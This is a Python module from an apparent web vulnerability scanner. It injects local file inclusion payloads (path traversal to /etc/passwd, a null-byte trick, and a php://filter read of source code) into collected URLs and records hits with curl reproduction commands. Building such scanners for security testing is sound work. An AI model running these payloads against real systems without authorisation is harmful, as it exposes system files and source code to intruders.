from __future__ import annotations
from .base import Finding, Module

PAY = ["../../../../etc/passwd", "....//....//....//etc/passwd",
       "/etc/passwd%00", "..%2f..%2f..%2f..%2fetc%2fpasswd",
       "php://filter/convert.base64-encode/resource=index.php"]


class LFIHunt(Module):
    name = "lfi"
    phase = 7

    async def run(self):
        urls = await self.ctx.store.get_state(self.ctx.job_id, "param_urls") or []
        findings = []
        for url in urls[:100]:
            self.ctx.check()
            for p in PAY:
                inj = url + ("&" if "?" in url else "?") + f"file={p}"
                try:
                    r = await self.ctx.http.get(inj, timeout=12)
                except Exception:
                    continue
                if "root:x:0:0" in r.text:
                    findings.append(await self.emit(Finding(
                        kind="lfi", title="Local File Inclusion (/etc/passwd terbaca)",
                        target=inj, severity="high", confidence="tentative",
                        evidence=r.text[:600], repro=[f"curl -s '{inj}'"],
                        poc=f"curl -s '{inj}'",
                        data={"vector": "lfi", "url": inj, "payload": p})))
                    break
        return findings

    async def verify(self, f: Finding) -> bool:
        try:
            r = await self.ctx.http.get(f.target, timeout=12)
            return "root:x:0:0" in r.text
        except Exception:
            return False
